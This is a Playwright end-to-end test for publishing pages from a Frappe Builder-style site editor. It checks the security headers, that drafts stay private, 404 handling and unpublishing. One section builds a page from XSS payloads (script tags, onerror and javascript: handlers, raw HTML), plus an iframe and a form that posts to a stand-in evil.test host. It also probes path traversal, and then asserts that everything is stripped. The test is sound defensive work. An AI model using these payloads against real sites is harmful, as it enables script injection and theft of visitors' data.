import { test, expect, type Page } from "@playwright/test";
import { createProfessional, localIP, newActor } from "./helpers";

/** What the editor asks of its server, asked the way the editor asks (same origin, with the header that marks its calls). */
const asEditor = (page: Page, method: string, params: Record<string, unknown>) =>
  page.evaluate(
    async ([name, body]) => {
      const base = (window as unknown as { __EDITOR_API__: string }).__EDITOR_API__;
      const response = await fetch(`${base}/api/method/${name}`, { method: "POST", headers: { "content-type": "application/json", "x-site-request": "1" }, body: JSON.stringify(body) });
      return { status: response.status, body: await response.json() };
    },
    [method, params] as const,
  );

const block = (over: Record<string, unknown>) => ({ blockId: crypto.randomUUID().slice(0, 8), ...over });

test("frappe publish: a page made in the editor is published at /site/<address> as a document of its own, with what the person drew, nothing of the draft, nothing that runs, and it goes away when unpublished", async ({
  page,
  browser,
  baseURL,
}, testInfo) => {
  test.skip(testInfo.project.name === "mobile", "The editor is a tool for a computer.");
  test.setTimeout(240_000);
  await page.setViewportSize({ width: 1700, height: 1000 });
  await page.setExtraHTTPHeaders({ "cf-connecting-ip": localIP() });
  const unique = crypto.randomUUID().slice(0, 8);
  await createProfessional(page, `Estúdio ${unique}`, "Marina Publica");
  const slug = `estudio-${unique}`;
  const mount = new URL(baseURL!).pathname.replace(/\/$/, "");

  // A page cannot be published where the site has no address.
  await page.goto("./profissional/meu-site/editor");
  await expect(page.getByRole("heading", { name: "All Pages" })).toBeVisible();
  const lonely = await asEditor(page, "frappe.client.insert", { doc: { doctype: "Builder Page", page_title: "Sem endereço", route: "sem-endereco", blocks: "[]", draft_blocks: "[]" } });
  expect(lonely.status).toBe(200);
  const lonelyName = (lonely.body as { message: { name: string } }).message.name;
  const refused = await asEditor(page, "run_doc_method", { dt: "Builder Page", dn: lonelyName, method: "publish", args: {} });
  expect(refused.status).toBe(417);
  expect(JSON.stringify(refused.body)).toContain("endereço do site");
  await asEditor(page, "frappe.client.delete", { doctype: "Builder Page", name: lonelyName });

  // The address of the site is made where it always was.
  await page.goto("./profissional/meu-site");
  const create = page.getByRole("form", { name: "Criar o meu site" });
  await create.getByRole("button", { name: "Criar meu site" }).click();
  await expect(page.getByRole("region", { name: "Editor novo (Frappe Builder)" })).toBeVisible();

  // ---- a page from scratch in the editor: a container and a text drawn on it, published with the button ----
  await page.goto("./profissional/meu-site/editor");
  await page.getByRole("button", { name: "New", exact: true }).click();
  await page.getByText("Start from scratch").click();
  await expect(page).toHaveURL(new RegExp(`${mount}/profissional/meu-site/editor/page/[a-z0-9-]+$`));
  const pageName = new URL(page.url()).pathname.split("/").pop()!;
  await expect(page.getByText("body", { exact: true }).first()).toBeVisible();
  await page.keyboard.press("c");
  await expect(async () => {
    await page.mouse.move(560, 260);
    await page.mouse.down();
    await page.mouse.move(900, 420, { steps: 8 });
    await page.mouse.up();
    await expect(page.getByText("container", { exact: true }).first()).toBeVisible({ timeout: 2000 });
  }).toPass({ timeout: 20_000 });
  const read = async () => {
    const answer = await asEditor(page, "frappe.client.get", { doctype: "Builder Page", name: pageName });
    return (answer.body as { message?: Record<string, unknown> }).message ?? {};
  };
  await expect.poll(async () => String((await read()).draft_blocks ?? ""), { timeout: 30_000 }).toMatch(/"children":\[\{/);
  await page.getByRole("button", { name: "Publish", exact: true }).click();
  await expect.poll(async () => Number((await read()).published), { timeout: 30_000 }).toBe(1);

  // ---- the public page: a document of its own, with its own policy, and what was drawn ----
  const url = `./site/${slug}`;
  const first = await page.request.get(url);
  expect(first.status()).toBe(200);
  expect(first.headers()["content-type"]).toContain("text/html");
  expect(first.headers()["content-security-policy"]).toContain("default-src 'none'");
  expect(first.headers()["content-security-policy"]).not.toContain("script-src");
  expect(first.headers()["x-frame-options"]).toBe("DENY");
  expect(first.headers()["cache-control"]).toBe("public, no-cache");
  const html = await first.text();
  expect(html).toMatch(/^<!DOCTYPE html>/);
  expect(html).toMatch(/<body class="fb-1">\s*<div class="fb-2"/);
  expect(html).toMatch(/\.fb-2 \{[^}]*background-color: #ededed/);
  expect(html).not.toContain("<script");
  expect(html.replace(/--builder-image-dim/g, "")).not.toMatch(/frappe|builder/i); // nothing of the editor's own shows in the page (but the name of one variable)
  const etag = first.headers().etag!;
  expect((await page.request.get(url, { headers: { "if-none-match": etag } })).status()).toBe(304);

  // Seen in a browser, from under the mount, with nothing asked of another site and nothing of the tool around it.
  const outside: string[] = [];
  const origin = new URL(baseURL!).origin;
  const visitor = await newActor(browser, baseURL);
  visitor.page.on("request", (request) => {
    if (!request.url().startsWith(`${origin}/`) && !request.url().startsWith("data:")) outside.push(request.url());
  });
  const seen = await visitor.page.goto(`./site/${slug}`);
  expect(seen?.status()).toBe(200);
  await expect(visitor.page.locator("body > div")).toHaveCount(1);
  const background = await visitor.page.locator("body > div > div").first().evaluate((element) => getComputedStyle(element).backgroundColor);
  expect(background).toBe("rgb(237, 237, 237)");
  expect(outside).toEqual([]);

  // ---- the draft is not public: a change in the editor shows only after publishing it ----
  const editedDraft = JSON.stringify([block({ originalElement: "body", element: "div", baseStyles: { display: "flex" }, children: [block({ element: "p", innerHTML: "RASCUNHO NOVO" })] })]);
  await asEditor(page, "frappe.client.set_value", { doctype: "Builder Page", name: pageName, fieldname: { draft_blocks: editedDraft } });
  const afterDraft = await (await page.request.get(url)).text();
  expect(afterDraft).not.toContain("RASCUNHO NOVO");
  expect(afterDraft).toBe(html);

  // ---- what is written by hand into the page's data is rewritten as it is published: nothing runs, nothing leaves ----
  const hostile = JSON.stringify([
    block({
      originalElement: "body",
      element: "div",
      baseStyles: { display: "flex", backgroundImage: "url(https://evil.test/p.png)", color: "red; } body { display: none" },
      children: [
        block({ element: "p", innerHTML: '<img src=x onerror="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)" onclick="alert(4)">link</a><b>negrito</b>' }),
        block({ element: "script", innerHTML: "alert(5)" }),
        block({ element: "iframe", attributes: { src: "https://evil.test" } }),
        block({ element: "a", attributes: { href: "javascript:alert(6)", onclick: "alert(7)" }, innerHTML: "x" }),
        block({ element: "form", attributes: { action: "https://evil.test/steal" }, children: [block({ element: "input", attributes: { type: "text", name: "a" } })] }),
        block({ element: "div", originalElement: "__raw_html__", innerHTML: "<script>alert(8)</script>" }),
      ],
    }),
  ]);
  const made = await asEditor(page, "frappe.client.insert", { doc: { doctype: "Builder Page", page_title: "Hostil", route: "hostil", blocks: "[]", draft_blocks: hostile } });
  const hostileName = (made.body as { message: { name: string } }).message.name;
  expect((await asEditor(page, "run_doc_method", { dt: "Builder Page", dn: hostileName, method: "publish", args: {} })).status).toBe(200);
  const hostilePage = await page.request.get(`./site/${slug}/hostil`);
  expect(hostilePage.status()).toBe(200);
  const hostileHtml = await hostilePage.text();
  expect(hostileHtml).toContain("<b>negrito</b>");
  expect(hostileHtml).not.toMatch(/<script|<iframe|onerror|onclick|javascript:|evil\.test|alert\(|action=|display: none/i);

  // ---- an address that is not a page, a page that is not published and another site's address are the same answer ----
  for (const path of [`./site/${slug}/nao-existe`, `./site/${slug}/..%2Fhostil`, `./site/${slug}/hostil/`, `./site/nao-existe-${unique}`, `./site/${slug}/%00`]) {
    const answer = await page.request.get(path);
    expect(answer.status(), path).toBe(404);
    expect(await answer.text()).toContain("Página não encontrada");
  }

  // ---- unpublished, the page is gone at the next request ----
  expect((await asEditor(page, "run_doc_method", { dt: "Builder Page", dn: pageName, method: "unpublish", args: {} })).status).toBe(200);
  expect((await page.request.get(url)).status()).toBe(200); // the other page still stands: it answers the home address
  expect((await asEditor(page, "run_doc_method", { dt: "Builder Page", dn: hostileName, method: "unpublish", args: {} })).status).toBe(200);
  const gone = await page.request.get(url);
  expect(gone.status()).toBe(404);
  expect(gone.headers()["cache-control"]).toBe("no-store");
  await visitor.context.close();
});
